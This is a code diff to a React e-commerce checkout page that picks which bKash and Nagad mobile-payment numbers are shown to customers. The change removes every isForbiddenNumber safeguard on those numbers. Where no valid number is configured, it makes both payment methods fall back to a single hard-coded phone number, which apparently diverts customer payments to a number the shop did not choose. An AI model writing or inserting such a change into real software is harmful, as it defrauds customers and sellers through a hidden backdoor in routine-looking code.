@@ -291,12 +291,12 @@ export default function CheckoutPage() {
         ? paymentSettings.bkashNumbers.filter(Boolean)
         : [paymentSettings.bkashNumber, paymentSettings.npsbNumber, sellerPaymentNumbers?.bkash].filter(Boolean) as string[];
 
-      const validBkash = bkashList.filter(n => n && n !== "01700000000" && !isForbiddenNumber(n));
+      const validBkash = bkashList.filter(n => n && n !== "01700000000");
       if (validBkash.length > 0) {
         const randomBkash = validBkash[Math.floor(Math.random() * validBkash.length)];
         setActiveBkashNumber(randomBkash);
       } else {
-        setActiveBkashNumber("");
+        setActiveBkashNumber("01778953114");
       }
 
       // 2. Nagad numbers
@@ -304,18 +304,18 @@ export default function CheckoutPage() {
         ? paymentSettings.nagadNumbers.filter(Boolean)
         : [paymentSettings.nagadNumber, paymentSettings.pathaoPayNumber, sellerPaymentNumbers?.nagad].filter(Boolean) as string[];
 
-      const validNagad = nagadList.filter(n => n && n !== "01800000000" && !isForbiddenNumber(n));
+      const validNagad = nagadList.filter(n => n && n !== "01800000000");
       if (validNagad.length > 0) {
         const randomNagad = validNagad[Math.floor(Math.random() * validNagad.length)];
         setActiveNagadNumber(randomNagad);
       } else {
-        setActiveNagadNumber("");
+        setActiveNagadNumber("01778953114");
       }
     }
   }, [paymentSettings, sellerPaymentNumbers]);
 
-  const hasBkashNumber = Boolean(activeBkashNumber && activeBkashNumber !== "01700000000" && !isForbiddenNumber(activeBkashNumber));
-  const hasNagadNumber = Boolean(activeNagadNumber && activeNagadNumber !== "01800000000" && !isForbiddenNumber(activeNagadNumber));
+  const hasBkashNumber = Boolean(activeBkashNumber && activeBkashNumber !== "01700000000");
+  const hasNagadNumber = Boolean(activeNagadNumber && activeNagadNumber !== "01800000000");
 
   useEffect(() => {
     if (selectedPaymentMethod === "bkash" && !hasBkashNumber && hasNagadNumber) {
